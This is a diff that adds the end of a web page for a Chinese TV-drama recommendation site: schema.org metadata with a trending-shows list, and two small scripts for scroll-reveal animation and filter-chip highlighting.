+      "description":"SP影视剧整理高分剧集片单、新剧上线日历、热播榜单与观众短评，帮你在三分钟内挑到能看的那一部。",
+      "publisher":{"@id":"https://spyingshiju-app.github.io/#org"}
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://spyingshiju-app.github.io/#org",
+      "name":"SP影视剧",
+      "url":"https://spyingshiju-app.github.io/",
+      "description":"剧集片单与追剧指南站点，每日两次更新。"
+    },
+    {
+      "@type":"ItemList",
+      "name":"SP影视剧近7天热播榜",
+      "itemListOrder":"https://schema.org/ItemListOrderDescending",
+      "numberOfItems":10,
+      "itemListElement":[
+        {"@type":"ListItem","position":1,"name":"沉默的证词"},
+        {"@type":"ListItem","position":2,"name":"深空信标"},
+        {"@type":"ListItem","position":3,"name":"三十七度二"},
+        {"@type":"ListItem","position":4,"name":"小院春秋"},
+        {"@type":"ListItem","position":5,"name":"第九会议室"}
+      ]
+    }
+  ]
+}
+</script>
+<script>
+(function(){
+  var items=document.querySelectorAll('.reveal');
+  if(!items.length) return;
+  if(!('IntersectionObserver' in window)){
+    items.forEach(function(el){el.classList.add('in');});
+    return;
+  }
+  var io=new IntersectionObserver(function(entries){
+    entries.forEach(function(e){
+      if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); }
+    });
+  },{threshold:.12});
+  items.forEach(function(el){io.observe(el);});
+})();
+(function(){
+  var chips=document.querySelectorAll('.chips a');
+  chips.forEach(function(a){
+    a.addEventListener('click',function(){
+      chips.forEach(function(x){x.classList.remove('on');});
+      a.classList.add('on');
+    });
+  });
+})();
+</script>
+</body>
+</html>
